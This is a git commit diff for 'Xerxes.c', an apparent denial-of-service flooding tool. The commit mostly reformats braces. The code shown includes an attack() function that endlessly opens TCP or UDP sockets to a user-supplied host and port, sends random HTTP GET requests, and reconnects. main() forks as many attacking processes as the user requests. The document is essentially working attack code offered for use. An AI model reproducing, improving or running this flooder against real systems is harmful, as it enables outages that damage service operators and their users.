b4eab4cb4235b51d8f27ddcbd26ba08b2776d5df
lpfan4ever <dominik.francan@hotmail.com>
2017-07-18 20:33:59 +0200

    Version 1.0

--- Xerxes.c
+++ Xerxes.c
@@ -16,7 +16,8 @@
 int Threads = 0;
 int Connections = 0;
 
-int make_socket(char *host, char *port, int modus) {
+int make_socket(char *host, char *port, int modus) 
+{
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
 	memset(&hints, 0, sizeof(hints));
@@ -27,21 +28,24 @@ int make_socket(char *host, char *port, int modus) {
 	else
 	  hints.ai_socktype = SOCK_DGRAM;//UDP
 
-	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) 
+	{
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
 		exit(0);
 	}
-	for(p = servinfo; p != NULL; p = p->ai_next) {
-		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+	for(p = servinfo; p != NULL; p = p->ai_next) 
+	{
+		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) 
 			continue;
-		}
-		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
+		{
 			close(sock);
 			continue;
 		}
 		break;
 	}
-	if(p == NULL) {
+	if(p == NULL) 
+	{
 		if(servinfo)
 			freeaddrinfo(servinfo);
 		fprintf(stderr, "No connection could be made\n");
@@ -53,11 +57,13 @@ int make_socket(char *host, char *port, int modus) {
 	return sock;
 }
 
-void broke(int s) {
+void broke(int s) 
+{
 	// do nothing
 }
 
-void attack(char *host, char *port, int id, int modus) {
+void attack(char *host, char *port, int id, int modus) 
+{
 	int sockets[Connections];
 	int x, r, i, n, buf;
 	char string[10];
@@ -65,26 +71,25 @@ void attack(char *host, char *port, int id, int modus) {
 	char httpbuf[2024];
 	char s_copy[132];
 
-
-
 	for(x=0; x!= Connections; x++)
 		sockets[x]=0;
 
 	signal(SIGPIPE, &broke);
 
-	while(1) {
-		for(x=0; x != Connections; x++) {
+	while(1) 
+	{
+		for(x=0; x != Connections; x++) 
+		{
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port, modus);
     
-	srand(time(NULL));
-	for( j = 0; j < 9; j++){
-        string[j] = 'A' + rand()%26; // starting on '0', ending on '}'	
-	}
+			srand(time(NULL));
+			for( j = 0; j < 9; j++)
+        		string[j] = 'A' + rand()%26; // starting on '0', ending on '}'	
 	
-	sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
-	strncpy(s_copy, httpbuf, sizeof(s_copy));
-	int sizebuf = sizeof s_copy - 1;
+			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
+			strncpy(s_copy, httpbuf, sizeof(s_copy));
+			int sizebuf = sizeof s_copy - 1;
 			r=write(sockets[x], s_copy, sizebuf);
 			close(sockets[x]);
 			sockets[x] = make_socket(host, port, modus);
@@ -94,7 +99,8 @@ void attack(char *host, char *port, int id, int modus) {
 	}
 }
 
-int main(int argc, char **argv) {
+int main(int argc, char **argv) 
+{
 	int x;
 	int modus;
 	char ip[30];
@@ -111,7 +117,8 @@ int main(int argc, char **argv) {
 	printf("Threads?\n");
     scanf("%d",&Threads);
 
-	for(x=0; x != Threads; ++x) {
+	for(x=0; x != Threads; ++x) 
+	{
 		if(fork())
 			attack(ip, port, x, modus);
 		usleep(200000);
